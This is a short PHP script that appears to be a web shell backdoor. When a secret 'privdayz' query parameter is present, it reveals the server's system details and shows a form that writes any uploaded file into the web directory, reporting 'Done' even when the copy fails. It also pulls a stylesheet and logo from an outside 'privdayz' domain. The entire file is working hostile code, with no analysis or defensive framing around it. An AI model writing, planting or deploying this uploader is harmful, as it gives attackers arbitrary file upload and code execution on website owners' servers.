<?php
if ( isset($_GET['privdayz']) )
{
	echo '<link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet">
<center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center><b>'.php_uname().'<br></b><b><br><br>'.''.'<br></b>';
	echo '<form action="" method="post" enctype="multipart/form-data" name="b4b4" id="b4b4">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
		echo '<a href="https://privdayz.com/">www.privdayz.com</a>';
	if( $_POST['_upl'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Done</b><br><br>'; }
		else { echo '<b>Done</b><br><br>'; }
	}
exit;
}?>